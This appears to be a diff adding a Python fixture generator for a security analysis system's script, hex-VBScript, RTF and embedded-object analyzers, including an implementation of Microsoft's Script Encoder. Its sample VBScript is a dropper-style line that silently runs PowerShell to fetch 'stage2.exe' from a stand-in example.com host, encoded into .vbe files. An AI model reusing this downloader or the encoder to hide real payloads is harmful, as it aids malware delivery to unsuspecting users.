@@ -1,0 +1,269 @@
+#!/usr/bin/env python3
+"""Makes the files PLAN.md 7.5 batch 6's modules are compared on: scripts encoded with Microsoft's
+Script Encoder for microsoft_script_encoding_analysis, VBScript with runs of hex for vbscript_analyzer,
+RTF for nowhitespace_analyzer, and files an RTF's objects could be for extracted_rtf_analyzer. Each is
+written here byte by byte; the encoder below is the inverse of the decoder ace3 runs
+(bin/jscript.decode.pl). It needs only Python, and writes the same bytes each time.
+
+    tools/samples/make-scripts    writes tools/ace3/dumps/fixtures/scripts, the dumps' files,
+                                  and a few samples under samples/ace4/scripts, in the manifest
+"""
+
+import base64
+import hashlib
+import json
+import struct
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent.parent.parent
+SAMPLES = ROOT / "samples"
+SCRIPTS = SAMPLES / "ace4" / "scripts"
+FIXTURES = ROOT / "tools" / "ace3" / "dumps" / "fixtures" / "scripts"
+SOURCE = "tools/samples/make-scripts"
+
+# --- the Script Encoder ----------------------------------------------------------------------------
+
+# The decoder's tables: which of the three each position uses, and what each byte below 0x80 decodes
+# to. 0xFF is the escape, '@'.
+ITAB = [
+    0, 2, 1, 0, 2, 1, 2, 1, 1, 2, 1, 2, 0, 1, 2, 1, 0, 1, 2, 1, 0, 0, 2, 1, 1, 2, 0, 1, 2, 1, 1, 2,
+    0, 0, 1, 2, 1, 2, 1, 0, 1, 0, 0, 2, 1, 0, 1, 2, 0, 1, 2, 1, 0, 0, 2, 1, 1, 0, 0, 2, 1, 0, 1, 2,
+]
+DECODE = [
+    bytes.fromhex(
+        "000102030405060708570a0b0c0d0e0f101112131415161718191a1b1c1d1e1f"
+        "2e477a56426a2f26494134325b7672433839704568714f09624423753c7e3e5e"
+        "ff774a615d224b6f4e3b4c50672a7d74542b2d2c306e6b66352521644d52633f"
+        "7b7829287359337f6d55537c3a5f65465831696c5a48275c3d24793760512036"
+    ),
+    bytes.fromhex(
+        "0001020304050607087b0a0b0c0d0e0f101112131415161718191a1b1c1d1e1f"
+        "323021295b38333d583a3565395c5673664e456b6259785e7d4a6d713c603e53"
+        "ff422748727531374d5222546a47642d207f2e4c5d7e6c6f797443267625242b"
+        "28234134092a443f773b55696163506751494f46687c36706e7a2f5f4b5a2c57"
+    ),
+    bytes.fromhex(
+        "0001020304050607086e0a0b0c060e0f101112131415161718191a1b1c1d1e1f"
+        "2d755260715e495c627d2936207c7a7f6b63332b68516676316454433c3a3e7e"
+        "ff452c2a7427374479592f6f26726a397b3f387767534734785d30235a5b6c48"
+        "5570692e4c21244e5009567335614b583b57226d4d2528464a32413d5f4f4265"
+    ),
+]
+ESCAPES = {ord("\n"): b"&", ord("\r"): b"#", ord("<"): b"!", ord(">"): b"*", ord("@"): b"$"}
+
+
+def encode_body(plain):
+    """The encoded characters of plain, as the decoder reads them back."""
+    out = bytearray()
+    pos = 0
+    for c in plain:
+        if c in ESCAPES:
+            out += b"@" + ESCAPES[c]
+        elif c >= 0x80 or c < 0x20 and c != 9:
+            out.append(c)
+        else:
+            table = DECODE[ITAB[pos]]
+            out.append(next(b for b in range(0x80) if table[b] == c and b != 0x40))
+        pos = (pos + 1) % 64
+    return bytes(out)
+
+
+def number(n):
+    """A 32-bit number as the encoder writes its length and checksum: base64 of its bytes, 6 characters and ==."""
+    return base64.b64encode(struct.pack("<I", n & 0xFFFFFFFF))
+
+
+def encode(plain, leading=None, trailing=None):
+    body = encode_body(plain)
+    leading = number(len(body)) if leading is None else leading
+    trailing = number(sum(plain)) if trailing is None else trailing
+    return b"#@~^" + leading + body + trailing + b"^#~@"
+
+
+VBS = (
+    b"Dim shell, url\r\n"
+    b"url = \"http://dl.encoded-vbs.example.com/stage2.exe\"\r\n"
+    b"Set shell = CreateObject(\"WScript.Shell\")\r\n"
+    b"shell.Run \"cmd /c powershell -w hidden -c iwr \" & url, 0\r\n"
+)
+JS = (
+    b"var shell = new ActiveXObject(\"WScript.Shell\");\r\n"
+    b"if (1 < 2 && 3 > 2) { shell.Run(\"calc.exe\"); }\r\n"
+    b"// mail admin@encoded-js.example.com\r\n"
+)
+
+
+def mse_fixtures():
+    whole = encode(VBS)
+    files = {
+        "invoice.vbe": whole,
+        "loader.jse": encode(JS),
+        "LOUD.VBE": encode(VBS),
+        "encoded.txt": encode(b"MsgBox \"plain name\"\r\n"),
+        "tabs.vbe": encode(b"If x Then\r\n\tMsgBox \"tab\"\r\nEnd If\r\n"),
+        # the end marker cut off
+        "truncated.vbe": whole[: len(whole) // 2],
+        # the leading number isn't six base64 characters and ==
+        "bad_checksum.vbe": encode(VBS, leading=b"AA!AAA=="),
+        "short_checksum.vbe": encode(VBS, leading=b"AAAA=="),
+        # no trailing number: the decoder decodes up to the end marker
+        "no_trailing.vbe": encode(VBS, trailing=b""),
+        # a trailing number followed by a newline, which Perl's $ still matches before
+        "trailing_newline.vbe": encode(VBS, trailing=number(sum(VBS)) + b"\n"),
+        # two newlines: the number isn't at the end, so it is decoded too
+        "trailing_newlines.vbe": encode(VBS, trailing=number(sum(VBS)) + b"\n\n"),
+        # only the first block is decoded
+        "two_blocks.vbe": encode(b"MsgBox \"first\"\r\n") + b"\r\n" + encode(b"MsgBox \"second\"\r\n"),
+        # every escape, an unknown one, and an escape at the very end
+        "escapes.vbe": b"#@~^AAAAAA==" + encode_body(b"a<b>c@d\r\n") + b"@x@&@#@!@*@$@" + b"^#~@",
+        # bytes past 0x7f and a NUL go through as they are, still counting positions
+        "high_bytes.vbe": b"#@~^AAAAAA==" + encode_body("caf\u00e9 \u00ff\x00 ok".encode("latin-1")) + b"^#~@",
+        "header_only.vbe": b"#@~^",
+        "empty_body.vbe": b"#@~^AAAAAA==^#~@",
+        "no_end.vbe": b"#@~^AAAAAA==" + encode_body(b"never ends"),
+        "not_at_start.vbe": b" " + whole,
+        "lowercase_marker.vbe": b"#@~^" + whole[4:].replace(b"^#~@", b"^#~a"),
+        # what the decoder writes starts with the marker again
+        "twice.vbe": encode(encode(b"MsgBox \"inner\"\r\n")),
+        # a name the decoder's output can't take: 255 bytes is the most a name may be
+        ("x" * 241) + ".vbe": encode(b"MsgBox \"long name\"\r\n"),
+    }
+    return files
+
+
+# --- VBScript with hex ---------------------------------------------------------------------------------
+
+
+def hex_run(n, seed):
+    digest = b""
+    while len(digest) < n:
+        digest += hashlib.sha256(f"{seed}/{len(digest)}".encode()).hexdigest().encode()
+    return digest[:n]
+
+
+def vbs_fixtures():
+    blob = b"".join(hex_run(80, f"blob{i}") + b"\r\n" for i in range(20))
+    many = b"".join(b"a(" + str(i).encode() + b") = \"" + hex_run(60, f"many{i}") + b"\"\r\n" for i in range(101))
+    hundred = b"".join(b"a(" + str(i).encode() + b") = \"" + hex_run(60, f"many{i}") + b"\"\r\n" for i in range(100))
+    fifty = b"".join(b"a(" + str(i).encode() + b") = \"" + hex_run(50, f"fifty{i}") + b"\"\r\n" for i in range(150))
+    words = b"Dim payload\r\npayload = \"" + hex_run(400, "words") + b"\"\r\nExecute Decode(payload)\r\n"
+    return {
+        "hex_blob.vbs": b"Dim s\r\ns = \"\" _\r\n" + blob + b"Execute s\r\n",
+        "many_same.vbs": many,
+        "exactly_100.vbs": hundred,
+        "length_50.vbs": fifty,
+        "comments.vbs": (
+            b"' " + hex_run(200, "c1") + b"\r\n"
+            b"   REM " + hex_run(200, "c2") + b"\r\n"
+            b"\t' " + hex_run(200, "c3") + b"\r\n"
+            b"rem " + hex_run(60, "c4") + b"\r\n"
+            b"x = 1\r\n"
+        ),
+        # whitespace inside a run, Python's str.isspace of each byte, doesn't end it
+        "split_whitespace.vbs": b"x = \"abcde \t12345\x0b\x0c67890\x1cABCDE\x1f\x85fedcb\xa0aaaaa\r\n00000\"\r\n",
+        "short_runs.vbs": b"x = \"abcd\" & \"1234\" & \"ABCD\"\r\n",
+        "to_eof.vbs": b"x = 1\r\ny = " + hex_run(70, "eof"),
+        "clean.vbs": b"Dim fso\r\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\r\nfaded = \"decade\"\r\n",
+        "hex.txt": words,
+        "UPPER.VBS": words,
+        "lf.vbs": words.replace(b"\r\n", b"\n"),
+        # 50 hex characters in 320 bytes: exactly 15.625%, which rounds to 15.62 as Python rounds a tie
+        "tie.vbs": hex_run(50, "tie") + b"\n" + b"-" * 269,
+        "only_hex.vbs": hex_run(64, "only"),
+    }
+
+
+# --- RTF -----------------------------------------------------------------------------------------------
+
+
+def rtf_fixtures():
+    return {
+        "spaced.rtf": b"{\\rtf1\\ansi \\deff0\r\n{\\fonttbl {\\f0 Times;}}\r\n\t{\\b bold}\x0c text\x0b here\n}\r\n",
+        "backslash.rtf": b"\\rtf1 {\\b x y}\r\n",
+        "no_whitespace.rtf": b"{\\rtf1\\ansi{\\b\\i}}",
+        "nul.rtf": b"{\\rtf1 a\x00b \x85\xa0c}\r\n",
+        "plain.txt": b"plain text, {\\rtf1 later}\r\n",
+        # a name the output can't take
+        ("r" * 244) + ".rtf": b"{\\rtf1 long name}\r\n",
+        "short.rtf": b"{\\r",
+        "done.rtf.nowhitespace": b"{\\rtf1 already stripped}\r\n",
+    }
+
+
+# --- what an RTF's objects can be ----------------------------------------------------------------------
+
+
+def pe32():
+    """The smallest file libmagic calls a PE32 executable: a DOS header pointing at a PE header."""
+    dos = bytearray(b"MZ" + bytes(0x3A) + struct.pack("<I", 0x40))
+    coff = b"PE\x00\x00" + struct.pack("<HHIIIHH", 0x14C, 1, 0, 0, 0, 0xE0, 0x0102)
+    optional = struct.pack("<H", 0x10B) + bytes(0x5A) + struct.pack("<H", 2) + bytes(0xE0 - 0x5C)
+    return bytes(dos) + coff + optional + bytes(40)
+
+
+def extracted_fixtures():
+    lnk = bytes.fromhex("4c0000000114020000000000c000000000000046") + bytes(56)
+    return {
+        "payload.exe": pe32(),
+        "payload.bin": pe32(),
+        # an MS-DOS executable, whose mime type is application/x-dosexec
+        "stub.dat": b"MZ" + bytes(62) + b"\xb4\x4c\xcd\x21" + bytes(60),
+        "shortcut.bin": lnk,
+        "dropper.vbs": VBS,
+        "archive.ZIP": b"PK\x05\x06" + bytes(18),
+        "notes.txt": b"just some words\n",
+    }
+
+
+# --- samples ---------------------------------------------------------------------------------------------
+
+
+def samples():
+    return {
+        "invoice.vbe": encode(VBS),
+        "loader.jse": encode(JS),
+        "hexdropper.vbs": b"Dim s\r\n' decode and run\r\ns = \"\" _\r\n"
+        + b"".join(b"  & \"" + hex_run(64, f"sample{i}") + b"\" _\r\n" for i in range(30))
+        + b"  & \"\"\r\nExecute s\r\n",
+    }
+
+
+def write(folder, files):
+    for name, data in files.items():
+        path = folder / name
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_bytes(data)
+
+
+def main():
+    write(FIXTURES / "mse", mse_fixtures())
+    write(FIXTURES / "vbs", vbs_fixtures())
+    write(FIXTURES / "rtf", rtf_fixtures())
+    write(FIXTURES / "extracted", extracted_fixtures())
+
+    made = []
+    for name, data in samples().items():
+        SCRIPTS.mkdir(parents=True, exist_ok=True)
+        (SCRIPTS / name).write_bytes(data)
+        made.append(
+            {
+                "path": f"ace4/scripts/{name}",
+                "sha256": hashlib.sha256(data).hexdigest(),
+                "size": len(data),
+                "kinds": ["scripts"],
+                "source": SOURCE,
+                "in_git": True,
+                "alert_path": name,
+                "meta_tags": ["type=email.attachment"],
+            }
+        )
+    manifest_path = SAMPLES / "manifest.json"
+    manifest = json.loads(manifest_path.read_text())
+    kept = [s for s in manifest["samples"] if s.get("source") != SOURCE]
+    manifest["samples"] = sorted(kept + made, key=lambda s: s["path"])
+    manifest_path.write_text(json.dumps(manifest, indent=2, ensure_ascii=False) + "\n")
+    print(f"{len(made)} samples")
+
+
+if __name__ == "__main__":
+    main()
